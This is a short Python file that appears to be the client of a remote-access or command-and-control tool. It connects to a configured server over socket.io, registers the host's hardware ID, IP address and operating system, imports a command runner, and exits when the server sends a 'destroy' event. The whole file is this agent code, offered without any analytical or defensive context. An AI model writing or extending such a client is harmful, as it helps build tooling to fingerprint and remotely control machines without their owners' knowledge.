import socketio
from command_handler import run_command
from utils.system_info import get_hwid, get_ip, get_os
from config import SERVER_URL 
import sys

sio = socketio.Client()

@sio.event
def connect():
    print('Connection established')
    register_client()

@sio.event
def disconnect():
    print('Disconnected from server')


def connect_to_server():
    print("[*] Connecting to server...")
    sio.connect(SERVER_URL)
    sio.wait()

@sio.on('destroy')
def destroy_connection():
    sio.disconnect()
    sys.exit(0)

def register_client():
    client_info = {
        'hwid': get_hwid(),
        'ip': get_ip(),
        'os': get_os()
    }
    sio.emit("register", client_info)